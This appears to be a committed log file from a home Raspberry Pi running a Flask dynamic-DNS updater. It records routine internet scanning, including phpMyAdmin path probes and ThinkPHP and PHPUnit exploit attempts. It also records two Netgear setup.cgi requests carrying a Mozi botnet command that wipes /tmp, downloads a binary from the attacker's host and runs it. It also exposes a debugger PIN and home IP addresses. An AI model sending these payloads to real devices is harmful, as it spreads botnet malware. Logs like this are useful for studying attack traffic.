+165.232.170.144 - - [26/Apr/2021 19:47:47] "[33mGET /dbadmin/index.php?lang=en HTTP/1.1[0m" 404 -
+165.232.170.144 - - [26/Apr/2021 19:47:47] "[33mGET /phpMyAdmin3/index.php?lang=en HTTP/1.1[0m" 404 -
+165.232.170.144 - - [26/Apr/2021 19:47:48] "[33mGET /administrator/web/index.php?lang=en HTTP/1.1[0m" 404 -
+165.232.170.144 - - [26/Apr/2021 19:47:48] "[33mGET /mysqladmin/index.php?lang=en HTTP/1.1[0m" 404 -
+165.232.170.144 - - [26/Apr/2021 19:47:49] "[33mGET /db/phpMyAdmin-3/index.php?lang=en HTTP/1.1[0m" 404 -
+165.232.170.144 - - [26/Apr/2021 19:47:49] "[33mGET /phpMyAdmin2/index.php?lang=en HTTP/1.1[0m" 404 -
+165.232.170.144 - - [26/Apr/2021 19:47:50] "[33mGET /phpmyadmin2013/index.php?lang=en HTTP/1.1[0m" 404 -
+165.232.170.144 - - [26/Apr/2021 19:47:50] "[33mGET /phpmyadmin2/index.php?lang=en HTTP/1.1[0m" 404 -
+165.232.170.144 - - [26/Apr/2021 19:47:51] "[33mGET /db/phpMyAdmin3/index.php?lang=en HTTP/1.1[0m" 404 -
+165.232.170.144 - - [26/Apr/2021 19:47:51] "[33mGET /mysql/index.php?lang=en HTTP/1.1[0m" 404 -
+165.232.170.144 - - [26/Apr/2021 19:47:52] "[33mGET /db/phpMyAdmin3/index.php?lang=en HTTP/1.1[0m" 404 -
+165.232.170.144 - - [26/Apr/2021 19:47:52] "[33mGET /mysqlmanager/index.php?lang=en HTTP/1.1[0m" 404 -
+165.232.170.144 - - [26/Apr/2021 19:47:53] "[33mGET /db/db-admin/index.php?lang=en HTTP/1.1[0m" 404 -
+165.232.170.144 - - [26/Apr/2021 19:47:54] "[33mGET /admin/sysadmin/index.php?lang=en HTTP/1.1[0m" 404 -
+165.232.170.144 - - [26/Apr/2021 19:47:54] "[33mGET /mysql/dbadmin/index.php?lang=en HTTP/1.1[0m" 404 -
+165.232.170.144 - - [26/Apr/2021 19:47:55] "[33mGET /MyAdmin/index.php?lang=en HTTP/1.1[0m" 404 -
+165.232.170.144 - - [26/Apr/2021 19:47:55] "[33mGET /pma2016/index.php?lang=en HTTP/1.1[0m" 404 -
+165.232.170.144 - - [26/Apr/2021 19:47:56] "[33mGET /phpmyadmin2017/index.php?lang=en HTTP/1.1[0m" 404 -
+165.232.170.144 - - [26/Apr/2021 19:47:56] "[33mGET /phpmyadmin2020/index.php?lang=en HTTP/1.1[0m" 404 -
+165.232.170.144 - - [26/Apr/2021 19:47:57] "[33mGET /administrator/pma/index.php?lang=en HTTP/1.1[0m" 404 -
+165.232.170.144 - - [26/Apr/2021 19:47:57] "[33mGET /mysql/web/index.php?lang=en HTTP/1.1[0m" 404 -
+165.232.170.144 - - [26/Apr/2021 19:47:58] "[33mGET /db/phpmyadmin/index.php?lang=en HTTP/1.1[0m" 404 -
+165.232.170.144 - - [26/Apr/2021 19:47:58] "[33mGET /phpmyadmin4/index.php?lang=en HTTP/1.1[0m" 404 -
+165.232.170.144 - - [26/Apr/2021 19:47:59] "[33mGET /sql/websql/index.php?lang=en HTTP/1.1[0m" 404 -
+165.232.170.144 - - [26/Apr/2021 19:47:59] "[33mGET /sql/phpMyAdmin/index.php?lang=en HTTP/1.1[0m" 404 -
+165.232.170.144 - - [26/Apr/2021 19:48:00] "[33mGET /PMA2017/index.php?lang=en HTTP/1.1[0m" 404 -
+165.232.170.144 - - [26/Apr/2021 19:48:01] "[33mGET /db/phpMyAdmin-3/index.php?lang=en HTTP/1.1[0m" 404 -
+165.232.170.144 - - [26/Apr/2021 19:48:01] "[33mGET /sql/phpMyAdmin2/index.php?lang=en HTTP/1.1[0m" 404 -
+165.232.170.144 - - [26/Apr/2021 19:48:02] "[33mGET /admin/index.php?lang=en HTTP/1.1[0m" 404 -
+165.232.170.144 - - [26/Apr/2021 19:48:02] "[33mGET /mysql/pma/index.php?lang=en HTTP/1.1[0m" 404 -
+165.232.170.144 - - [26/Apr/2021 19:48:03] "[33mGET /phpmyadmin2015/index.php?lang=en HTTP/1.1[0m" 404 -
+165.232.170.144 - - [26/Apr/2021 19:48:03] "[33mGET /db/phpMyAdmin-3/index.php?lang=en HTTP/1.1[0m" 404 -
+165.232.170.144 - - [26/Apr/2021 19:48:04] "[33mGET /sql/webadmin/index.php?lang=en HTTP/1.1[0m" 404 -
+165.232.170.144 - - [26/Apr/2021 19:48:04] "[33mGET /pma2018/index.php?lang=en HTTP/1.1[0m" 404 -
+165.232.170.144 - - [26/Apr/2021 19:48:05] "[33mGET /mysql/sqlmanager/index.php?lang=en HTTP/1.1[0m" 404 -
+165.232.170.144 - - [26/Apr/2021 19:48:05] "[33mGET /PMA/index.php?lang=en HTTP/1.1[0m" 404 -
+165.232.170.144 - - [26/Apr/2021 19:48:06] "[33mGET /program/index.php?lang=en HTTP/1.1[0m" 404 -
+165.232.170.144 - - [26/Apr/2021 19:48:06] "[33mGET /PMA2020/index.php?lang=en HTTP/1.1[0m" 404 -
+165.232.170.144 - - [26/Apr/2021 19:48:07] "[33mGET /php-myadmin/index.php?lang=en HTTP/1.1[0m" 404 -
+165.232.170.144 - - [26/Apr/2021 19:48:07] "[33mGET /phpmyAdmin/index.php?lang=en HTTP/1.1[0m" 404 -
+165.232.170.144 - - [26/Apr/2021 19:48:08] "[33mGET /sql/myadmin/index.php?lang=en HTTP/1.1[0m" 404 -
+165.232.170.144 - - [26/Apr/2021 19:48:09] "[33mGET /phpMyAdmin5/index.php?lang=en HTTP/1.1[0m" 404 -
+165.232.170.144 - - [26/Apr/2021 19:48:09] "[33mGET /dbadmin/index.php?lang=en HTTP/1.1[0m" 404 -
+165.232.170.144 - - [26/Apr/2021 19:48:10] "[33mGET /phpmy-admin/index.php?lang=en HTTP/1.1[0m" 404 -
+165.232.170.144 - - [26/Apr/2021 19:48:10] "[33mGET /pma2021/index.php?lang=en HTTP/1.1[0m" 404 -
+165.232.170.144 - - [26/Apr/2021 19:48:11] "[33mGET /sql/sql-admin/index.php?lang=en HTTP/1.1[0m" 404 -
+165.232.170.144 - - [26/Apr/2021 19:48:11] "[33mGET /mysql/db/index.php?lang=en HTTP/1.1[0m" 404 -
+165.232.170.144 - - [26/Apr/2021 19:48:12] "[33mGET /shopdb/index.php?lang=en HTTP/1.1[0m" 404 -
+165.232.170.144 - - [26/Apr/2021 19:48:12] "[33mGET /sql/sqlweb/index.php?lang=en HTTP/1.1[0m" 404 -
+165.232.170.144 - - [26/Apr/2021 19:48:13] "[33mGET /phpMyAdmin3/index.php?lang=en HTTP/1.1[0m" 404 -
+165.232.170.144 - - [26/Apr/2021 19:48:13] "[33mGET /PMA2018/index.php?lang=en HTTP/1.1[0m" 404 -
+165.232.170.144 - - [26/Apr/2021 19:48:14] "[33mGET /PMA2012/index.php?lang=en HTTP/1.1[0m" 404 -
+66.240.205.34 - - [26/Apr/2021 19:58:48] code 400, message Bad request version ('ô')
+66.240.205.34 - - [26/Apr/2021 19:58:48] "[35m[1mH   tj¨#D+Êð§»lÅ×¶íJnÁùxu[lðE-jìÔxLÉrÉuà%Rtgfv]%ÌèÏ® µÀfÈDÅ	ô[0m" HTTPStatus.BAD_REQUEST -
+107.151.182.58 - - [26/Apr/2021 20:15:24] "[33mGET / HTTP/1.1[0m" 404 -
+109.73.184.193 - - [26/Apr/2021 21:35:59] "[33mGET / HTTP/1.1[0m" 404 -
+188.166.75.230 - - [26/Apr/2021 21:47:08] code 400, message Bad HTTP/0.9 request type ('\x16\x03\x01\x01û\x01\x00\x01÷\x03\x03§3Ô\x1aAY,\x7fkJ²\x83þ[ög')
+188.166.75.230 - - [26/Apr/2021 21:47:08] "[35m[1mû ÷§3ÔAY,kJ²þ[ögÏ2UMÖMÓíÅd³² <ÌÌÌÀ0À,À(À$ÀÀ[0m" HTTPStatus.BAD_REQUEST -
+222.137.195.240 - - [26/Apr/2021 22:00:10] "[33mPOST /HNAP1/ HTTP/1.0[0m" 404 -
+209.141.58.91 - - [26/Apr/2021 23:06:25] "[33mGET /config/getuser?index=0 HTTP/1.1[0m" 404 -
+89.248.170.22 - - [26/Apr/2021 23:11:32] "[33mGET / HTTP/1.1[0m" 404 -
+104.238.150.98 - - [26/Apr/2021 23:21:17] "[33mGET / HTTP/1.0[0m" 404 -
+112.234.189.193 - - [27/Apr/2021 00:59:06] "[33mGET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://112.234.189.193:43578/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1 HTTP/1.0[0m" 404 -
+89.248.170.22 - - [27/Apr/2021 01:00:17] "[33mHEAD / HTTP/1.0[0m" 404 -
+5.188.210.227 - - [27/Apr/2021 01:16:19] code 400, message Bad request syntax ('\x05\x01\x00')
+5.188.210.227 - - [27/Apr/2021 01:16:19] "[35m[1m [0m" HTTPStatus.BAD_REQUEST -
+5.188.210.227 - - [27/Apr/2021 01:16:24] code 400, message Bad request syntax ('\x05\x01\x00')
+5.188.210.227 - - [27/Apr/2021 01:16:24] "[35m[1m [0m" HTTPStatus.BAD_REQUEST -
+5.188.210.227 - - [27/Apr/2021 01:16:30] code 400, message Bad request syntax ('\x05\x01\x00')
+5.188.210.227 - - [27/Apr/2021 01:16:30] "[35m[1m [0m" HTTPStatus.BAD_REQUEST -
+5.188.210.227 - - [27/Apr/2021 01:17:09] code 400, message Bad request syntax ('\x04\x01\x00P\x05¼Òã\x00')
+5.188.210.227 - - [27/Apr/2021 01:17:09] "[35m[1m P¼Òã [0m" HTTPStatus.BAD_REQUEST -
+5.188.210.227 - - [27/Apr/2021 01:17:14] code 400, message Bad request syntax ('\x04\x01\x00P\x05¼Òã\x00')
+5.188.210.227 - - [27/Apr/2021 01:17:14] "[35m[1m P¼Òã [0m" HTTPStatus.BAD_REQUEST -
+5.188.210.227 - - [27/Apr/2021 01:17:21] code 400, message Bad request syntax ('\x04\x01\x00P\x05¼Òã\x00')
+5.188.210.227 - - [27/Apr/2021 01:17:21] "[35m[1m P¼Òã [0m" HTTPStatus.BAD_REQUEST -
+5.188.210.227 - - [27/Apr/2021 01:18:24] "[33mGET http://5.188.210.227/echo.php HTTP/1.1[0m" 404 -
+192.168.178.1 - - [27/Apr/2021 03:11:22] "[37mGET /dyndns/update_dns HTTP/1.1[0m" 200 -
+103.154.9.178 - - [27/Apr/2021 03:27:10] "[33mGET / HTTP/1.1[0m" 404 -
+182.121.201.46 - - [27/Apr/2021 03:30:11] "[33mGET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://182.121.201.46:33683/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1 HTTP/1.0[0m" 404 -
+192.168.178.1 - - [27/Apr/2021 03:40:23] "[37mGET /dyndns/update_dns HTTP/1.1[0m" 200 -
+192.168.178.1 - - [27/Apr/2021 04:09:25] "[37mGET /dyndns/update_dns HTTP/1.1[0m" 200 -
+92.42.9.27 - - [27/Apr/2021 04:10:54] "[33mGET / HTTP/1.1[0m" 404 -
+192.168.178.1 - - [27/Apr/2021 04:38:27] "[37mGET /dyndns/update_dns HTTP/1.1[0m" 200 -
+172.104.242.173 - - [27/Apr/2021 04:43:16] "[33mGET /0bef HTTP/1.0[0m" 404 -
+209.141.58.91 - - [27/Apr/2021 04:46:46] "[33mGET /config/getuser?index=0 HTTP/1.1[0m" 404 -
+192.168.178.1 - - [27/Apr/2021 05:07:30] "[37mGET /dyndns/update_dns HTTP/1.1[0m" 200 -
+192.168.178.1 - - [27/Apr/2021 05:36:31] "[37mGET /dyndns/update_dns HTTP/1.1[0m" 200 -
+192.168.178.1 - - [27/Apr/2021 06:05:33] "[37mGET /dyndns/update_dns HTTP/1.1[0m" 200 -
+120.52.152.3 - - [27/Apr/2021 06:13:34] "[33mGET / HTTP/1.0[0m" 404 -
+192.168.178.1 - - [27/Apr/2021 06:34:36] "[37mGET /dyndns/update_dns HTTP/1.1[0m" 200 -
+89.248.170.22 - - [27/Apr/2021 06:48:15] "[33mGET / HTTP/1.1[0m" 404 -
+192.168.178.1 - - [27/Apr/2021 07:03:37] "[37mGET /dyndns/update_dns HTTP/1.1[0m" 200 -
+42.237.91.248 - - [27/Apr/2021 07:04:45] "[33mGET /boaform/admin/formLogin?username=ec8&psd=ec8 HTTP/1.0[0m" 404 -
+128.14.211.194 - - [27/Apr/2021 07:09:55] "[33mGET / HTTP/1.1[0m" 404 -
+89.248.165.163 - - [27/Apr/2021 07:21:27] "[33mGET / HTTP/1.1[0m" 404 -
+192.168.178.1 - - [27/Apr/2021 07:32:39] "[37mGET /dyndns/update_dns HTTP/1.1[0m" 200 -
+192.168.178.1 - - [27/Apr/2021 08:01:41] "[37mGET /dyndns/update_dns HTTP/1.1[0m" 200 -
+192.168.178.1 - - [27/Apr/2021 08:30:43] "[37mGET /dyndns/update_dns HTTP/1.1[0m" 200 -
+192.168.178.1 - - [27/Apr/2021 08:59:45] "[37mGET /dyndns/update_dns HTTP/1.1[0m" 200 -
+192.168.178.1 - - [27/Apr/2021 09:28:47] "[37mGET /dyndns/update_dns HTTP/1.1[0m" 200 -
+103.70.39.70 - - [27/Apr/2021 09:41:50] "[33mGET / HTTP/1.1[0m" 404 -
+192.241.218.89 - - [27/Apr/2021 09:51:44] "[33mGET /portal/redlion HTTP/1.1[0m" 404 -
+192.168.178.1 - - [27/Apr/2021 09:57:49] "[37mGET /dyndns/update_dns HTTP/1.1[0m" 200 -
+ * Detected change in '/home/pi/dyndns-script/dyndns.py', reloading
+Error while IP detection
+Logging in
+Getting Records
+Found A domain "api": 17035564
+IPv4 update failed
+Found AAAA domain "api": 16686697
+IPv6 change failed
+
+Logging in
+Getting Records
+Found A domain "api": 17035564
+IPv4 update failed
+Found AAAA domain "api": 16686697
+IPv6 change failed
+
+Logging in
+Getting Records
+Found A domain "api": 17035564
+IPv4 update failed
+Found AAAA domain "api": 16686697
+IPv6 change failed
+
+Logging in
+Getting Records
+Found A domain "api": 17035564
+IPv4 update failed
+Found AAAA domain "api": 16686697
+IPv6 change failed
+
+Logging in
+Getting Records
+Found A domain "api": 17035564
+IPv4 update failed
+Found AAAA domain "api": 16686697
+IPv6 change failed
+
+Logging in
+Getting Records
+Found A domain "api": 17035564
+IPv4 update failed
+Found AAAA domain "api": 16686697
+IPv6 change failed
+
+Logging in
+Getting Records
+Found A domain "api": 17035564
+IPv4 update failed
+Found AAAA domain "api": 16686697
+IPv6 change failed
+
+Logging in
+Getting Records
+Found A domain "api": 17035564
+IPv4 update failed
+Found AAAA domain "api": 16686697
+IPv6 change failed
+
+Logging in
+Getting Records
+Found A domain "api": 17035564
+IPv4 update failed
+Found AAAA domain "api": 16686697
+IPv6 change failed
+
+Logging in
+Getting Records
+Found A domain "api": 17035564
+IPv4 update failed
+Found AAAA domain "api": 16686697
+IPv6 change failed
+
+Logging in
+Getting Records
+Found A domain "api": 17035564
+IPv4 update failed
+Found AAAA domain "api": 16686697
+IPv6 change failed
+
+Logging in
+Getting Records
+Found A domain "api": 17035564
+IPv4 update failed
+Found AAAA domain "api": 16686697
+IPv6 change failed
+
+Logging in
+Getting Records
+Found A domain "api": 17035564
+IPv4 update failed
+Found AAAA domain "api": 16686697
+IPv6 change failed
+
+Logging in
+Getting Records
+Found A domain "api": 17035564
+IPv4 update failed
+Found AAAA domain "api": 16686697
+IPv6 change failed
+
+Logging in
+Getting Records
+Found A domain "api": 17035564
+IPv4 update failed
+Found AAAA domain "api": 16686697
+IPv6 change failed
+
+Logging in
+Getting Records
+Found A domain "api": 17035564
+IPv4 update failed
+Found AAAA domain "api": 16686697
+IPv6 change failed
+
+ * Restarting with stat
+ * Debugger is active!
+ * Debugger PIN: 224-380-604
+ * Detected change in '/home/pi/dyndns-script/dyndns.py', reloading
+ * Restarting with stat
+ * Debugger is active!
+ * Debugger PIN: 224-380-604
+Logging in
+Getting Records
+Found A domain "api": 17035564
+IPv4 change successful on subdomain "api" to new IP "87.123.93.71"
+Found AAAA domain "api": 16686697
+IPv6 change successful on subdomain "api" to new IP "2001:16b8:a5b:fc00:1423:e727:4c28:ae20"
+
+192.168.178.1 - - [27/Apr/2021 10:06:22] "[37mGET /dyndns/update_dns HTTP/1.1[0m" 200 -
+192.241.217.121 - - [27/Apr/2021 10:13:05] "[33mGET /actuator/health HTTP/1.1[0m" 404 -
+184.105.139.68 - - [27/Apr/2021 10:31:19] "[33mGET / HTTP/1.1[0m" 404 -
+Logging in
+Getting Records
+Found A domain "api": 17035564
+IPv4 change successful on subdomain "api" to new IP "87.123.93.71"
+Found AAAA domain "api": 16686697
+IPv6 change successful on subdomain "api" to new IP "2001:16b8:a5b:fc00:1423:e727:4c28:ae20"
+
+192.168.178.1 - - [27/Apr/2021 10:35:24] "[37mGET /dyndns/update_dns HTTP/1.1[0m" 200 -
+5.235.227.147 - - [27/Apr/2021 10:36:47] "[33mGET / HTTP/1.1[0m" 404 -
+192.241.218.58 - - [27/Apr/2021 11:24:12] "[33mGET /hudson HTTP/1.1[0m" 404 -
+91.227.69.108 - - [27/Apr/2021 11:26:30] "[33mPOST /_ignition/execute-solution HTTP/1.1[0m" 404 -
+91.227.69.108 - - [27/Apr/2021 11:26:30] "[33mPOST /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1[0m" 404 -
+91.227.69.108 - - [27/Apr/2021 11:26:30] "[33mGET /login HTTP/1.1[0m" 404 -
+91.227.69.108 - - [27/Apr/2021 11:26:30] "[33mGET /jenkins/login HTTP/1.1[0m" 404 -
+91.227.69.108 - - [27/Apr/2021 11:26:30] "[33mGET /manager/html HTTP/1.1[0m" 404 -
+91.227.69.108 - - [27/Apr/2021 11:26:31] "[33mGET /wp-login.php HTTP/1.1[0m" 404 -
+91.227.69.108 - - [27/Apr/2021 11:26:31] "[33mGET /?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=__HelloThinkPHP HTTP/1.1[0m" 404 -
+ * Detected change in '/home/pi/dyndns-script/dyndns.py', reloading
+ * Restarting with stat
+ * Debugger is active!
+ * Debugger PIN: 224-380-604
+193.46.255.97 - - [27/Apr/2021 12:30:12] "[33mHEAD /robots.txt HTTP/1.0[0m" 404 -
+87.123.93.71 - - [27/Apr/2021 12:46:12] "[33mGET / HTTP/1.1[0m" 404 -
+87.123.93.71 - - [27/Apr/2021 12:46:12] "[33mGET /favicon.ico HTTP/1.1[0m" 404 -
